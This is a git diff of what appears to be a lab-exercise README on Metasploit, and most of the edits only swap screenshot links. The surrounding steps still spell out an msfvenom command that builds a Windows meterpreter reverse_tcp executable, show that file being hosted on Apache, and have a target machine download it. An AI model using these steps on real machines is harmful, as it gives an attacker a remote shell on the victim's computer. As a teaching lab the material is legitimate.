@@ -25,21 +25,20 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
-<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/97348bb1-6e53-4168-8ffb-4ea280af62ed" />
+<img width="699" height="331" alt="image" src="https://github.com/user-attachments/assets/3f10331c-c5ad-4e7b-9f29-20590e40309d" />
 
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
-<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/4d21a99e-87a2-4b4e-a0c4-f6421340b276" />
+<img width="704" height="491" alt="image" src="https://github.com/user-attachments/assets/9dd5f8ff-be50-46d5-80af-b323089a81f4" />
 
 
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
-<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/f91a71df-5e9c-4de7-8519-43d419b96984" />
-
+<img width="704" height="491" alt="image" src="https://github.com/user-attachments/assets/184cf332-9a70-479c-8db1-a6379a31489b" />
 
 
 Start apache server
@@ -56,14 +55,14 @@ Check the status of apache2
 
 Invoke msfconsole:
 ## OUTPUT:
-<img width="1918" height="1079" alt="image" src="https://github.com/user-attachments/assets/a99de3c8-25ec-49cb-935e-6c9df37b85b6" />
+<img width="696" height="531" alt="image" src="https://github.com/user-attachments/assets/575fded7-f629-4578-ab62-414affaca177" />
 
 
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
-<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/00db1bbf-8c68-4764-ac9e-824a2cf23823" />
+<img width="696" height="719" alt="image" src="https://github.com/user-attachments/assets/c803e499-fb57-4870-aca1-af6752e55d01" />
 
 
 
@@ -79,7 +78,7 @@ set LHOST 0.0.0.0
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.56.102/fun.exe  ( Replace IP address appropriately)
-The file "paveen16.exe" downloads. 
+The file "kvk.exe" downloads. 
 ## OUTPUT:
 
 <img width="1919" height="1079" alt="Screenshot 2026-02-14 131800" src="https://github.com/user-attachments/assets/0e5a7ba1-ebd2-4d80-9ccd-16d12878fb82" />
